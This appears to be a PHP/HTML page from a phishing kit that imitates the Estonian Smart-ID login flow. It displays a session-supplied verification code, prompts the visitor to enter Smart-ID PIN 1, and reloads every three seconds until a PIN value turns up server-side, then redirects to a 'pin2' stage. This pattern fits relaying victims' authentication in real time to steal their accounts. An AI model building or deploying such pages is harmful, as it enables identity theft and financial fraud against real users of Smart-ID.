
<?php 
isset($_SESSION['user_code_info'])?$users=$_SESSION['user_code_info']:$users='';
isset($_SESSION['user_pin_code'])?$users_pin=$_SESSION['user_pin_code']:$users_pin='';
?>

    <div class="mt-30">
        <div class="container">
            <div class="title ml-20">Login sisse</div>
            <div class="step">
                <div class="setp-1" style="padding: 10px 10px;">
                        1 &nbspKasutajatunnus  
                </div>
                <div class="step-2">             
                </div>
                <div class="setp-3" style="padding: 10px 10px;">
                        &nbsp&nbsp&nbsp2 &nbsp Salasõnad
                </div>
            </div>
            <div class="content mt-30" >
                <div class="row ">
                    <div class="col-md-8">
						<div class="mt-30">
                            <div style="padding: 20px;">
                            <span style="font-size: 20px; padding-top: 20px;">Kontrollkood (PEIDETUD TURVALISUSE EESMÄRGIL)&nbsp:&nbsp</span>
                            <span style="font-size: 20px; border:1.2px solid #999; border-radius: 3px; padding: 5px 10px;letter-spacing: 5px;" value=""><?php echo $users['code'];?> </span>
                            <br><br>
                            <p>Veenduge, et näete mobiiltelefoni ekraanil numbrit.<br>
							Seejärel sisestage Smart-ID PIN 1 kood.</p>
						    <p>Ootame vastust...</p>
                              
                                <hr style="border:1.2px solid white;">
                                <div class="mt-20">
                                    <button class="btn_2">Katkestan</button>                                
                                </div>  
                            </div>    
                        </div>
                    </div>
					<div class="col-md-4 mt-10 mb-10">
						<div class="img_bt"></div>
					</div>
				</div>
            </div>
        </div>
        
    </div>
    <script type="text/javascript">
        $(document).ready(function () {
            var search_value = '<?php echo $users_pin["pin_code"];?>';
            if(search_value){
                $(location).attr('href', '<?=base_url("pin2")?>');
            }else{
                setTimeout(function(){
                    location.reload(true);                   
                }, 3000);}
             });
    </script>
   
</body>

                        
